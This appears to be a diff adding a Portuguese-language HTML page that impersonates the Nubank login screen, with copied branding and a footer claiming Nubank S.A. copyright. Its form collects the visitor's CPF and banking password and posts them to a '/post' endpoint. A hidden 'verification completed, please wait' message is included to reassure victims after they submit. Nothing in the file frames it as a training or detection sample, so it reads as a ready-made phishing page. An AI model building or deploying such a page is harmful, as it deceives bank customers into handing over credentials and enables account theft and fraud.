@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nubank - Acesse sua conta</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #820AD1 0%, #9B2DD5 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            background: #fff;
+            border-radius: 16px;
+            padding: 40px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo svg {
+            width: 120px;
+            height: 40px;
+        }
+
+        h1 {
+            color: #820AD1;
+            font-size: 24px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        p {
+            color: #666;
+            text-align: center;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            color: #333;
+            font-weight: 500;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #820AD1;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #820AD1;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        button:hover {
+            background: #6B0AAD;
+        }
+
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #999;
+        }
+
+        .success {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .success h2 {
+            color: #4CAF50;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 100 30" fill="#820AD1"><text x="10" y="22" font-size="20"
+                    font-weight="bold">nubank</text></svg>
+        </div>
+        <div id="login-form">
+            <h1>Bem-vindo de volta</h1>
+            <p>Digite seu CPF e senha para acessar sua conta</p>
+            <form action="/post" method="post">
+                <div class="form-group">
+                    <label>CPF</label>
+                    <input type="text" name="user" placeholder="000.000.000-00" required>
+                </div>
+                <div class="form-group">
+                    <label>Senha</label>
+                    <input type="password" name="pass" placeholder="Sua senha de 8 dígitos" required>
+                </div>
+                <button type="submit">Entrar</button>
+            </form>
+            <div class="footer">Nubank S.A. © 2024. Todos os direitos reservados.</div>
+        </div>
+        <div class="success" id="success">
+            <h2>✓ Verificação concluída</h2>
+            <p>Aguarde enquanto validamos seus dados...</p>
+        </div>
+    </div>
+</body>
+
+</html>
